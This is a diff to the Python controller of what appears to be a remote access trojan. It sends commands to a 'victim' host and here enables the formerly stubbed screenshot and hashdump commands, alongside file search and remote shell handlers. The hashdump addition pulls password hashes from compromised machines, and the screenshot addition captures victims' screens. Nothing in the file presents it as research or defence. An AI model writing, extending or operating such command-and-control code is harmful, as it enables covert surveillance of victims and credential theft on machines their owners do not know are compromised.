@@ -22,6 +22,9 @@ def ipconfig(victim):
   victim.send('ip')
   print(victim.receive())
 
+def clear():
+  os.system('cls' if os.name == 'nt' else 'clear')
+
 def search(victim, filename, path):
   victim.send('search')
   victim.send(' '.join([filename,path]))
@@ -30,6 +33,15 @@ def search(victim, filename, path):
     print("File not found")
   else:
     print(result)
+
+def screenshot(victim,filename):
+  victim.send('screenshot')
+  victim.send(filename)
+  victim.receive_file()
+
+def hashdump(victim):
+  victim.send('hashdump')
+  print(victim.receive())
 
 def shell(victim):
   victim.send('shell')
@@ -82,13 +94,26 @@ def run_command(server, cmd):
     case 'ipconfig':
       ipconfig(server)
     case 'screenshot':
-      print('command still in dev :/')
-      #screenshot()
+      check = cmd.split(" ")
+      while '' in check:
+        check.remove('')
+      if len(check) ==1:
+        filename = "default"
+      else:
+        filename = check[1]
+      screenshot(server,filename)
+    case  'clear':
+      clear()
+    case 'cls':
+      clear()
     case 'search':
       check = cmd.split(" ")
       if len(check) ==2 and not "" in check:
         name = check[1]
-        path = '/'
+        if os.name =='nt':
+          path = 'C:\\'
+        else:
+          path= "/"
         search(server,name,path)
       elif len(check) ==3 and not "" in check :
         path = check[1]
@@ -97,8 +122,7 @@ def run_command(server, cmd):
       else:
         print("search file [path] Find the location of a file in a directory, defaults to root directory.")
     case 'hashdump':
-      print('command still in dev :/')
-      #hashdump()
+      hashdump(server)
     case '':
       pass
     case 'exit':
